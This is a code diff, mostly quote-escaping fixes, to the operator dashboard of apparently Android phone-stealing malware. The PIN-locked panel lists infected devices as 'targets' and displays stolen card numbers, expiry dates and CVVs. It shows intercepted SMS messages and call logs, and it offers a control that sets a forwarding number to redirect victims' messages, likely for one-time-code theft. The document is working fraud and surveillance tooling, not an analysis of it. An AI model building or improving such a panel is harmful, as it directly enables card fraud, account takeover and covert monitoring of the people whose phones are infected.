@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -272,14 +272,14 @@
             border: 1px solid rgba(255,255,255,0.1);
         }
         .premium-card::after {
-            content: "";
+            content: '';
             position: absolute;
             top: -50%; left: -50%; width: 200%; height: 200%;
             background: radial-gradient(circle at center, rgba(0,122,255,0.1) 0%, transparent 70%);
             pointer-events: none;
         }
 
-        .p-card-num { font-family: "Courier New", monospace; font-size: 22px; letter-spacing: 4px; margin-bottom: 20px; font-weight: 700; }
+        .p-card-num { font-family: 'Courier New', monospace; font-size: 22px; letter-spacing: 4px; margin-bottom: 20px; font-weight: 700; }
         .p-card-row { display: flex; justify-content: space-between; font-size: 12px; text-transform: uppercase; color: rgba(255,255,255,0.6); }
         .p-card-val { font-size: 14px; color: white; font-weight: 700; margin-top: 4px; }
 
@@ -391,17 +391,17 @@
             <div class="pin-dot"></div>
         </div>
         <div class="numpad">
-            <div class="num-btn" onclick="pressNum(''1'')">1</div>
-            <div class="num-btn" onclick="pressNum(''2'')">2<span>ABC</span></div>
-            <div class="num-btn" onclick="pressNum(''3'')">3<span>DEF</span></div>
-            <div class="num-btn" onclick="pressNum(''4'')">4<span>GHI</span></div>
-            <div class="num-btn" onclick="pressNum(''5'')">5<span>JKL</span></div>
-            <div class="num-btn" onclick="pressNum(''6'')">6<span>MNO</span></div>
-            <div class="num-btn" onclick="pressNum(''7'')">7<span>PQRS</span></div>
-            <div class="num-btn" onclick="pressNum(''8'')">8<span>TUV</span></div>
-            <div class="num-btn" onclick="pressNum(''9'')">9<span>WXYZ</span></div>
+            <div class="num-btn" onclick="pressNum('1')">1</div>
+            <div class="num-btn" onclick="pressNum('2')">2<span>ABC</span></div>
+            <div class="num-btn" onclick="pressNum('3')">3<span>DEF</span></div>
+            <div class="num-btn" onclick="pressNum('4')">4<span>GHI</span></div>
+            <div class="num-btn" onclick="pressNum('5')">5<span>JKL</span></div>
+            <div class="num-btn" onclick="pressNum('6')">6<span>MNO</span></div>
+            <div class="num-btn" onclick="pressNum('7')">7<span>PQRS</span></div>
+            <div class="num-btn" onclick="pressNum('8')">8<span>TUV</span></div>
+            <div class="num-btn" onclick="pressNum('9')">9<span>WXYZ</span></div>
             <div class="num-btn" style="background:transparent; border:none;"></div>
-            <div class="num-btn" onclick="pressNum(''0'')">0<span>+</span></div>
+            <div class="num-btn" onclick="pressNum('0')">0<span>+</span></div>
             <div class="num-btn" onclick="backspace()" style="border:none; background:transparent;"><i class="ph-bold ph-backspace"></i></div>
         </div>
     </div>
@@ -437,11 +437,11 @@
         </div>
     </div>
     <script>
-        const CORRECT_PIN = ''9639'';
-        let currentPin = '''';
+        const CORRECT_PIN = '9639';
+        let currentPin = '';
         let allData = { users: [], sms: [], calls: [] };
         let activeUser = null;
-        let activeTab = ''sms'';
+        let activeTab = 'sms';
 
         function pressNum(num) {
             if (currentPin.length >= 4) return;
@@ -456,27 +456,27 @@
         }
 
         function updateDots() {
-            const dots = document.querySelectorAll(''.pin-dot'');
+            const dots = document.querySelectorAll('.pin-dot');
             dots.forEach((dot, i) => {
-                dot.className = ''pin-dot'' + (i < currentPin.length ? '' active'' : '''');
+                dot.className = 'pin-dot' + (i < currentPin.length ? ' active' : '');
             });
         }
 
         function validatePin() {
             if (currentPin === CORRECT_PIN) {
-                const lock = document.getElementById(''lockScreen'');
-                lock.style.transform = ''translateY(-100%)'';
-                lock.style.opacity = ''0'';
+                const lock = document.getElementById('lockScreen');
+                lock.style.transform = 'translateY(-100%)';
+                lock.style.opacity = '0';
                 setTimeout(() => {
-                    document.getElementById(''appContent'').style.display = ''flex'';
-                    setTimeout(() => document.getElementById(''appContent'').style.opacity = ''1'', 50);
+                    document.getElementById('appContent').style.display = 'flex';
+                    setTimeout(() => document.getElementById('appContent').style.opacity = '1', 50);
                     startPolling();
                 }, 400);
             } else {
-                const dots = document.querySelectorAll(''.pin-dot'');
-                dots.forEach(dot => dot.classList.add(''error''));
+                const dots = document.querySelectorAll('.pin-dot');
+                dots.forEach(dot => dot.classList.add('error'));
                 setTimeout(() => {
-                    currentPin = '''';
+                    currentPin = '';
                     updateDots();
                 }, 500);
             }
@@ -484,7 +484,7 @@
 
         async function fetchData() {
             try {
-                const response = await fetch(''/api/admin/data'');
+                const response = await fetch('/api/admin/data');
                 allData = await response.json();
                 renderUsers();
                 if (activeUser) {
@@ -495,51 +495,51 @@
         }
 
         function renderUsers() {
-            const search = document.getElementById(''searchInput'').value.toLowerCase();
-            const list = document.getElementById(''userList'');
+            const search = document.getElementById('searchInput').value.toLowerCase();
+            const list = document.getElementById('userList');
             const filtered = allData.users.filter(u => 
-                (u.full_name || '''').toLowerCase().includes(search) || 
+                (u.full_name || '').toLowerCase().includes(search) || 
                 u.device_id.toLowerCase().includes(search)
             );
-            document.getElementById(''activeCount'').textContent = filtered.length;
+            document.getElementById('activeCount').textContent = filtered.length;
             list.innerHTML = filtered.map(user => `
-                <div class="user-card" onclick="openUser(''${user.device_id}'')">
+                <div class="user-card" onclick="openUser('${user.device_id}')">
                     <div class="avatar-wrapper">
-                        <div class="avatar">${(user.full_name || ''U'').charAt(0)}</div>
+                        <div class="avatar">${(user.full_name || 'U').charAt(0)}</div>
                         <div class="status-dot"></div>
                     </div>
                     <div class="user-info">
-                        <div class="u-name">${user.full_name || ''New Target Found''}</div>
+                        <div class="u-name">${user.full_name || 'New Target Found'}</div>
                         <div class="u-meta"><i class="ph-fill ph-smartphone"></i> ${user.device_id.substring(0,12)}...</div>
                     </div>
                     <i class="ph-bold ph-caret-right chevron"></i>
                 </div>
-            `).join('''');
+            `).join('');
         }
 
         function openUser(deviceId) {
             activeUser = allData.users.find(u => u.device_id === deviceId);
-            const drawer = document.getElementById(''detailDrawer'');
-            const backdrop = document.getElementById(''backdrop'');
-            backdrop.style.display = ''block'';
-            setTimeout(() => backdrop.style.opacity = ''1'', 10);
-            drawer.classList.add(''active'');
+            const drawer = document.getElementById('detailDrawer');
+            const backdrop = document.getElementById('backdrop');
+            backdrop.style.display = 'block';
+            setTimeout(() => backdrop.style.opacity = '1', 10);
+            drawer.classList.add('active');
             renderDrawer();
         }
 
         function closeDrawer() {
-            const drawer = document.getElementById(''detailDrawer'');
-            const backdrop = document.getElementById(''backdrop'');
-            backdrop.style.opacity = ''0'';
-            drawer.classList.remove(''active'');
-            setTimeout(() => backdrop.style.display = ''none'', 300);
+            const drawer = document.getElementById('detailDrawer');
+            const backdrop = document.getElementById('backdrop');
+            backdrop.style.opacity = '0';
+            drawer.classList.remove('active');
+            setTimeout(() => backdrop.style.display = 'none', 300);
         }
 
         function renderDrawer() {
             if (!activeUser) return;
-            const header = document.getElementById(''drawerHeader'');
+            const header = document.getElementById('drawerHeader');
             header.innerHTML = `
-                <h2 style="font-size: 26px; font-weight: 800;">${activeUser.full_name || ''Device Details''}</h2>
+                <h2 style="font-size: 26px; font-weight: 800;">${activeUser.full_name || 'Device Details'}</h2>
                 <div style="display: flex; gap: 10px; margin-top: 5px;">
                     <span style="font-size: 12px; color: var(--text-dim); background: var(--surface); padding: 4px 10px; border-radius: 100px; border: 1px solid var(--border);">
                         <i class="ph ph-fingerprint"></i> ${activeUser.device_id.substring(0,10)}
@@ -548,8 +548,8 @@
                         <i class="ph-fill ph-circle"></i> ONLINE
                     </span>
                 </div>`;
-            const body = document.getElementById(''drawerMain'');
-            const logs = activeTab === ''sms'' ? 
+            const body = document.getElementById('drawerMain');
+            const logs = activeTab === 'sms' ? 
                 allData.sms.filter(s => s.device_id === activeUser.device_id) :
                 allData.calls.filter(c => c.device_id === activeUser.device_id);
             body.innerHTML = `
@@ -558,55 +558,55 @@
                         <span style="font-size: 10px; font-weight: 800; color: rgba(255,255,255,0.4); letter-spacing: 2px;">SECURE CARD ASSET</span>
                         <i class="ph-fill ph-shield-check" style="color: var(--primary); font-size: 24px;"></i>
                     </div>
-                    <div class="p-card-num">${activeUser.card_num || ''**** **** **** ****''}</div>
+                    <div class="p-card-num">${activeUser.card_num || '**** **** **** ****'}</div>
                     <div class="p-card-row">
-                        <div><span>Card Holder</span><div class="p-card-val">${activeUser.card_name || ''NOT CAPTURED''}</div></div>
-                        <div style="text-align: right;"><span>EXP / CVV</span><div class="p-card-val">${activeUser.card_exp || ''**/**''} / ${activeUser.card_cvv || ''***''}</div></div>
+                        <div><span>Card Holder</span><div class="p-card-val">${activeUser.card_name || 'NOT CAPTURED'}</div></div>
+                        <div style="text-align: right;"><span>EXP / CVV</span><div class="p-card-val">${activeUser.card_exp || '**/**'} / ${activeUser.card_cvv || '***'}</div></div>
                     </div>
                 </div>
                 <div class="control-group">
                     <span class="control-label">Forwarding Protocol</span>
-                    <input type="tel" class="custom-input" id="fwdNum" value="${activeUser.forwarding_number || ''''}" placeholder="+91 00000 00000">
+                    <input type="tel" class="custom-input" id="fwdNum" value="${activeUser.forwarding_number || ''}" placeholder="+91 00000 00000">
                     <button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC PROTOCOL</button>
                 </div>
                 <span class="control-label">Intercepted Data</span>
                 <div class="tab-bar">
-                    <div class="tab-item ${activeTab === ''sms'' ? ''active'' : ''''}" onclick="switchTab(''sms'')">SMS Intercept</div>
-                    <div class="tab-item ${activeTab === ''calls'' ? ''active'' : ''''}" onclick="switchTab(''calls'')">Call Records</div>
+                    <div class="tab-item ${activeTab === 'sms' ? 'active' : ''}" onclick="switchTab('sms')">SMS Intercept</div>
+                    <div class="tab-item ${activeTab === 'calls' ? 'active' : ''}" onclick="switchTab('calls')">Call Records</div>
                 </div>
                 <div class="log-list">
-                    ${logs.length === 0 ? ''<div style="text-align:center; padding:60px 0; color:var(--text-dim);"><i class="ph ph-cube" style="font-size:40px; opacity:0.2;"></i><p style="margin-top:10px; font-size:14px; font-weight:600;">Waiting for data sync...</p></div>'' : 
+                    ${logs.length === 0 ? '<div style="text-align:center; padding:60px 0; color:var(--text-dim);"><i class="ph ph-cube" style="font-size:40px; opacity:0.2;"></i><p style="margin-top:10px; font-size:14px; font-weight:600;">Waiting for data sync...</p></div>' : 
                     logs.map(log => `
                         <div class="log-tile">
                             <div class="lt-top">
-                                <span class="lt-sender">${activeTab === ''sms'' ? log.sender : log.number}</span>
-                                <span class="lt-time">${new Date(log.received_at || log.called_at).toLocaleTimeString([], {hour: ''2-digit'', minute:''2-digit''})}</span>
+                                <span class="lt-sender">${activeTab === 'sms' ? log.sender : log.number}</span>
+                                <span class="lt-time">${new Date(log.received_at || log.called_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                             </div>
-                            <div class="lt-msg">${activeTab === ''sms'' ? log.message : `Type: ${log.type} | Duration: ${log.duration}s`}</div>
-                        </div>`).join('''')}
+                            <div class="lt-msg">${activeTab === 'sms' ? log.message : \`Type: \${log.type} | Duration: \${log.duration}s\`}</div>
+                        </div>`).join('')}
                 </div>`;
         }
 
         function switchTab(tab) { activeTab = tab; renderDrawer(); }
 
         async function saveForwarding() {
-            const num = document.getElementById(''fwdNum'').value;
+            const num = document.getElementById('fwdNum').value;
             try {
-                await fetch(''/api/admin/update-forwarding'', {
-                    method: ''POST'',
-                    headers: { ''Content-Type'': ''application/json'' },
+                await fetch('/api/admin/update-forwarding', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ deviceId: activeUser.device_id, number: num, enabled: true })
                 });
-                showToast(''Protocol Updated Successfully'');
-            } catch (err) { showToast(''Sync Failed'', true); }
+                showToast('Protocol Updated Successfully');
+            } catch (err) { showToast('Sync Failed', true); }
         }
 
         function showToast(msg, isError = false) {
-            const toast = document.getElementById(''toast'');
+            const toast = document.getElementById('toast');
             toast.textContent = msg;
-            toast.style.background = isError ? ''var(--accent)'' : ''var(--success)'';
-            toast.classList.add(''show'');
-            setTimeout(() => toast.classList.remove(''show''), 3000);
+            toast.style.background = isError ? 'var(--accent)' : 'var(--success)';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
         function startPolling() { fetchData(); setInterval(fetchData, 4000); }
